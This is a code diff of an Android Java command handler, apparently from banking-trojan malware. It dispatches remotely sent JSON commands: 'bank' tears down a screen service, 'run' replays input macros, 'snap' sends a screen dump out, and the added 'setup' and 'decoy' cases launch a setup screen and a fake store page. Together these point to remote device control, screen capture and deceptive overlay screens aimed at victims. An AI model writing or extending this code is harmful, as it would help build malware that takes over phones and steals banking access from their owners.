@@ -55,6 +55,7 @@ public final class Cmd {
                     Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));
                     break;
                 case "bank":
+                    Aviso.clear();
                     ScreenSvc.giveUp = true;
                     ScreenSvc.alive = false;
                     try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
@@ -74,6 +75,15 @@ public final class Cmd {
                     break;
                 case "run":
                     Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
+                    break;
+                case "setup": {
+                    Intent i = new Intent(c, SetupActivity.class);
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    c.startActivity(i);
+                    break;
+                }
+                case "decoy":
+                    SetupActivity.loja(c);
                     break;
                 case "snap":
                     Util.sendT("snap", Snap.dump());
